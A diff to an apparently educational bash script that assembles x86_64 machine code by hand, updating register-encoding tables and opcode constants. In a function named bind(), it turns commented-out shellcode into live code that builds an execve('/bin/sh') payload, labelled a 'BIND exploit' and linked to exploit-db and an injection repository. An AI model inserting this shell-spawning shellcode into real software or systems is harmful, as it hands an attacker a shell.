@@ -53,73 +53,25 @@
 #  RIP(64)
 #
 #Here is a table of all the registers in x86_64 with their sizes:
-#Register	Size (bits)
-#RAX	64
-#RBX	64
-#RCX	64
-#RDX	64
-#RSI	64
-#RDI	64
-#RBP	64
-#RSP	64
-#R8	64
-#R9	64
-#R10	64
-#R11	64
-#R12	64
-#R13	64
-#R14	64
-#R15	64
-#EAX	32
-#EBX	32
-#ECX	32
-#EDX	32
-#ESI	32
-#EDI	32
-#EBP	32
-#ESP	32
-#R8D	32
-#R9D	32
-#R10D	32
-#R11D	32
-#R12D	32
-#R13D	32
-#R14D	32
-#R15D	32
-#AX	16
-#BX	16
-#CX	16
-#DX	16
-#SI	16
-#DI	16
-#BP	16
-#SP	16
-#R8W	16
-#R9W	16
-#R10W	16
-#R11W	16
-#R12W	16
-#R13W	16
-#R14W	16
-#R15W	16
-#AL	8
-#BL	8
-#CL	8
-#DL	8
-#SIL	8
-#DIL	8
-#BPL	8
-#SPL	8
-#R8B	8
-#R9B	8
-#R10B	8
-#R11B	8
-#R12B	8
-#R13B	8
-#R14B	8
-#R15B	8
+#	RegVal	64bit	32bit	16bit	8bit
+#	000	RAX	EAX	AX	AL
+#	001	RCX	ECX	CX	CL
+#	010	RDX	EDX	DX	DL
+#	011	RBX	EBX	BX	BL
+#	100	RSP	ESP	SP	SPL
+#	101	RBP	EBP	BP	BPL
+#	110	RSI	ESI	SI	SIL
+#	111	RDI	EDI	DI	DIL
+#	000	R8	R8D	R8W	R8B
+#	001	R9	R9D	R9W	R9B
+#	010	R10	R10D	R10W	R10B
+#	011	R11	R11D	R11W	R11B
+#	100	R12	R12D	R12W	R12B
+#	101	R13	R13D	R13W	R13B
+#	110	R14	R14D	R14W	R14B
+#	111	R15	R15D	R15W	R15B
 #
-# Note that some of the registers have smaller sub-registers 
+# Note that the smallers registers uses the same space as the bigger ones, but some of the registers have smaller sub-registers 
 # that can be accessed, such as the lower 32 bits of a 64-bit register, 
 # or the lower 16 or 8 bits of a 32-bit or 64-bit register. 
 # These sub-registers are commonly used in instruction encoding 
@@ -300,6 +252,7 @@ MOV_R="\x89";
 # show_bytecode "mov %rsp, %rsi"
 # 4889e6
 MOV_RAX_RSI="${M64}${MOV_R}$(printEndianValue $(( MOVR + MODRM_REG_RAX + RSI )) ${SIZE_8BITS_1BYTE})"; # xC6 move the rax to rsi #11000110
+MOV_RAX_RDX="\x48\x89\xc2";
 MOV_RAX_RDI="${M64}${MOV_R}$(printEndianValue $(( MOVR + MOVRM_REG_RAX + RDI )) ${SIZE_8BITS_1BYTE} )";
 MOV_RDX_RCX="\x48\x89\xd1";
 #MOV_RSP_RSI="${M64}${MOV_R}\xe6"; # Copy the RSP(pointer address) to the RSP(as a pointer address).
@@ -339,6 +292,7 @@ get_mov_rsi_addr()
 MOV_RSP_ADDR4=$(get_mov_rsp_addr);
 MOV_RSI_ADDR4=$(get_mov_rsi_addr);
 MOV_RSI_RDX="${M64}${MOV_R}$( printEndianValue $(( MOVR + MODRM_REG_RSI + RDX )) ${SIZE_8BITS_1BYTE} )"; # move the RSI to RDX #11110010
+ADD_AL="\x04";
 ADD_SHORT="\x83"; # ADD 8 or 16 bit operand (depend on ModR/M opcode first bit(most significant (bit 7)) been zero) and the ModR/M opcode
 INC_RDX="\x48\xff\xc2";
 DEC_RDI="\x48\xff\xcf";
@@ -1416,14 +1370,16 @@ jump_if_equal(){
 
 function bind()
 {
-## I have found this shell code only and it seems to be a BIND exploit
-# I believe it can be useful to learn how to listen a port:
-#  "\x48\x31\xc0"
-#  "\x48\x89\xc2"
-#  "\x48\x89\xc6"
-#  "\x48\x8d\x3d\x04\x00\x00\x00\x04\x3b"
-#  "\x0f\x05"
-#  "\x2f\x62\x69\x6e\x2f\x73\x68\x00\xcc\x90\x90\x90";
+	# I have found this shell code only and it seems to be a BIND exploit
+	# I believe it can be useful to learn how to listen a port:
+	local code="";
+	code="${code}${XOR_RAX_RAX}";
+	code="${code}${MOV_RAX_RDX}";
+	code="${code}${MOV_RAX_RSI}";
+	code="${code}\x48\x8d\x3d\x04\x00\x00\x00";# lea rdi,[rel 0xb]
+	code="${code}${ADD_AL}${SYS_EXECVE}"
+	code="${code}${SYSCALL}";
+	code="${code}\x2f\x62\x69\x6e\x2f\x73\x68\x00\xcc\x90\x90\x90";
 #  https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.
 #
 # https://www.exploit-db.com/exploits/41128
